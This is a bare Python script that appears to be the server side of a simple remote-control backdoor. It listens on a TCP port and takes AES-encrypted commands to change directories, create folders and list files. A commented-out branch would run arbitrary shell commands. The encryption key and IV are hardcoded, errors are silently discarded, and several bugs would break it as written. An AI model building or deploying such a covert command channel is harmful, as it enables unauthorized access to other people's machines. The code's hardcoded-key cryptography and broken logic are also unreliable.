import os
import subprocess
import socket
from Crypto.Cipher import AES

def encrypt(encrypt_data):
    obj = AES.new(b"1122334456789001", AES.MODE_CFB, b"2299225510784791")
    data = obj.encrypt(encrypt_data)
    return data

def decrypt(decrypt_data):
    obj = AES.new(b"1122334456789001", AES.MODE_CFB, b"2299225510784791")
    data = obj.decrypt(decrypt_data)
    return data
host = "192.168.68.111"
port = 8080
ssocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssocket.bind((host, port))
ssocket.listen(5)
while True:
    try:
        consocket, addr = ssocket.accept()
        cmds = consocket.recv(2048)
        temp = decrypt(cmds)
        cmd = temp.decode() 
        while(cmd != "exit" and cmd != ""):
            print(addr, "  ", cmd)
            if cmd.startswith("cd"):
                try:
                    folder = cmd[cmd.index(" ") + 1:]
                    if folder == "..":
                        os.chdir("..")
                    else:
                        os.chdir(os.path.join(os.getcwd(), folder))
                except BaseException as e:
                    output = str(e)
                else:
                    output = "You are currently in: " + os.getcwd()
            elif cmd.startswith("mkdir"):
                try:
                    path = os.path.join(os.getcwd(), cmd[cmd.index(" ") + 1:])
                    os.mkdir(path)
                except BaseException as e:
                    output = str(e)
                else:
                    output = "Dir created"
            elif cmd == "ls":
                try:
                    path = os.getcwd()
                    dirs = os.listdir(path)
                except BaseException as e:
                    output = str(e)
                else:
                    output = str(dirs)
                #try:
                #    output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
                #except Execption as e:
                #    output = str(e)
                #else:
                #    if output == "":
                #            output = "Done"
            outputs = encrypt(output)
            consocket.send(outputs)
            cmds = consocket.recv(2048)
            temp = decrypt(cmds)
            cmd = temp.decode()
            if cmd == "exit":
                print("broken")
                consocket.close()
                break
        consocket.close()
    except Exception:
        pass
